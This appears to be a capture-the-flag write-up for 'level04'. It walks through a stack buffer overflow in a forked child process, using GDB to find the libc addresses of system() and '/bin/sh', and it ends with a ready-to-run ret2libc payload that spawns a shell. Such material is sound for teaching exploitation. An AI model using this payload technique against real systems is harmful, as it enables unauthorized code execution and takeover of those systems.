<h1 align="center"> LEVEL 4 </h1>

## 🔍 Analysis of Decompiled [level4](pseudo.c)

This level exploits a **stack buffer overflow**. The program has an input buffer that can be overflowed to hijack the return address.

**The vulnerability** exists in the child process, that reads user input into a fixed-size buffer without bounds checking.

### The Addresses (found via GDB)

```bash
 # GDB must follow the child after fork().
(gdb) set follow-fork-mode child 
(gdb) set detach-on-fork off
(gdb) break gets
(gdb) run < <(python -c 'print "A"*160')
(gdb) finish
```

```bash
(gdb) info proc map
process 1869
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fd9000 0xf7fdb000     0x2000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"

(gdb) x system
0xf7e6aed0 <system>:	 "\203\354\034\211t$\024\213t$ \211\\$\020菮\016"
```

[Hex2little](hex2little.py) output

```bash
python3 hex2little.py 
sh     -->  \xec\x97\xf8\xf7
system -->  \xd0\xae\xe6\xf7
```
**Breakdown:**
1. `"A"*156` - **Buffer padding** (156 bytes to reach return address)
2. `"\xd0\xae\xe6\xf7"` - **system() address** (little-endian)
3. `"EXIT"` - **Filler** (4 bytes for alignment)
4. `"\xec\x97\xf8\xf7"` - **"/bin/sh" address** (little-endian)


fgets writes 156+ bytes into 100-byte buffer overwrites the return address on the stack

## Final Payload

```bash
(python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "EXIT"+ "\xec\x97\xf8\xf7"';cat)| ./level04
```
